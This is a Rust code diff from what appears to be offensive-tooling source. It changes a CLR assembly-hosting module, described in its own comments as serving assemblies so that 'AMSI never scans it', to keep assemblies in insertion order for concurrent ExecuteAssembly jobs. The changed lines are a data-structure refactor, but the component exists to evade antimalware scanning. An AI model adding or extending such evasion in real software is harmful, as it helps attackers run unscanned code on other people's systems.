@@ -12,7 +12,6 @@
 //! 5. We return an IStream with the assembly bytes - AMSI never scans it!
 
 use crate::primitives::{IUnknownVtbl, Interface, GUID, HRESULT};
-use std::collections::HashMap;
 use std::ffi::c_void;
 use std::ptr;
 use std::sync::{Arc, Mutex};
@@ -104,37 +103,59 @@ pub struct IHostControlVtbl {
 // Our implementation storage
 // ============================================================================
 
-/// Storage for assembly bytes keyed by identity string
+/// Storage for assembly bytes, kept in insertion order so the
+/// most-recently-registered entry can be returned for ambiguous
+/// simple-name lookups.
+///
+/// Insertion order matters because the CLR queries `ProvideAssembly`
+/// with a normalized identity that **drops the version requirement** —
+/// observed in the wild as `version=0.0.0.0` regardless of what the
+/// requested AppDomain.Load_2 string contained. With a `HashMap` the
+/// fallback returned an arbitrary entry; with insertion-order storage
+/// the latest registration wins, which matches what concurrent
+/// ExecuteAssembly jobs need: each job re-registers its own bytes
+/// (with a unique AssemblyDef version courtesy of `patch_assembly_version`)
+/// just before calling `Load_2`, so "latest" is always the right pick.
 pub struct AssemblyStorage {
-    assemblies: HashMap<String, Vec<u8>>,
+    assemblies: Vec<(String, Vec<u8>)>,
 }
 
 impl AssemblyStorage {
     pub fn new() -> Self {
         Self {
-            assemblies: HashMap::new(),
+            assemblies: Vec::new(),
         }
     }
 
     pub fn register(&mut self, identity: &str, bytes: Vec<u8>) {
-        self.assemblies.insert(identity.to_string(), bytes);
+        // If the exact identity already exists, refresh its bytes in place
+        // (preserves position). Otherwise append at end so the new entry
+        // becomes "latest" for simple-name fallback.
+        if let Some(slot) = self
+            .assemblies
+            .iter_mut()
+            .find(|(k, _)| k == identity)
+        {
+            slot.1 = bytes;
+        } else {
+            self.assemblies.push((identity.to_string(), bytes));
+        }
     }
 
     pub fn get(&self, identity: &str) -> Option<&Vec<u8>> {
-        self.assemblies.get(identity)
+        self.assemblies
+            .iter()
+            .find(|(k, _)| k == identity)
+            .map(|(_, v)| v)
     }
 
-    /// Find an assembly by simple name (case-insensitive, ignores version/culture/etc.)
-    /// This is needed because the CLR normalizes identity strings before passing them
-    /// to ProvideAssembly, potentially adding fields like `processorArchitecture=MSIL`.
-    ///
-    /// **Do not use this when multiple versions of the same simple name are
-    /// registered concurrently** — `HashMap::iter` order is unspecified, so this
-    /// would return an arbitrary version. Prefer
-    /// [`Self::find_by_name_and_version`] which disambiguates by Version field.
+    /// Find an assembly by simple name (case-insensitive). Iterates
+    /// **latest-registered first** so concurrent ExecuteAssembly jobs
+    /// each get their own freshly-registered bytes — see
+    /// [`AssemblyStorage`] docs for why this is the right choice.
     pub fn find_by_simple_name(&self, simple_name: &str) -> Option<&Vec<u8>> {
         let needle = simple_name.trim().to_lowercase();
-        self.assemblies.iter().find_map(|(key, val)| {
+        self.assemblies.iter().rev().find_map(|(key, val)| {
             let stored_simple = key.split(',').next().unwrap_or(key).trim().to_lowercase();
             if stored_simple == needle {
                 Some(val)
@@ -144,17 +165,11 @@ impl AssemblyStorage {
         })
     }
 
-    /// Find an assembly by simple name **and** version. The CLR normalizes
-    /// identity strings before calling `ProvideAssembly` (often appending
-    /// `processorArchitecture=MSIL`), so an exact-string `get` may miss even
-    /// when an entry exists. Falling back to simple-name alone is unsafe when
-    /// multiple versions of the same name are registered (e.g. concurrent
-    /// ExecuteAssembly jobs that rely on per-task version bumps to defeat the
-    /// CLR's identity cache): `HashMap::iter` returns entries in
-    /// unspecified order so the wrong bytes may be served, causing the
-    /// running assembly to land in a previously-loaded AppDomain copy.
-    /// This matches by (simple name, Version=…) which is enough to keep
-    /// distinct concurrent invocations isolated.
+    /// Match by `(simple name, Version=…)`. Kept for callers that
+    /// pass a fully-qualified identity, but in practice the CLR's
+    /// `ProvideAssembly` query elides the requested version, so this
+    /// rarely fires for ExecuteAssembly. The latest-first
+    /// `find_by_simple_name` is the workhorse.
     pub fn find_by_name_and_version(
         &self,
         simple_name: &str,
@@ -162,7 +177,7 @@ impl AssemblyStorage {
     ) -> Option<&Vec<u8>> {
         let name_needle = simple_name.trim().to_lowercase();
         let version_needle = version.trim().to_lowercase();
-        self.assemblies.iter().find_map(|(key, val)| {
+        self.assemblies.iter().rev().find_map(|(key, val)| {
             let stored_simple = key.split(',').next().unwrap_or(key).trim().to_lowercase();
             if stored_simple != name_needle {
                 return None;
@@ -912,7 +927,7 @@ unsafe extern "system" fn host_assembly_store_provide_assembly(
         identity,
         clr_simple_name,
         clr_version,
-        storage.assemblies.keys().collect::<Vec<_>>()
+        storage.assemblies.iter().map(|(k, _)| k).collect::<Vec<_>>()
     );
 
     let mut path = "miss";
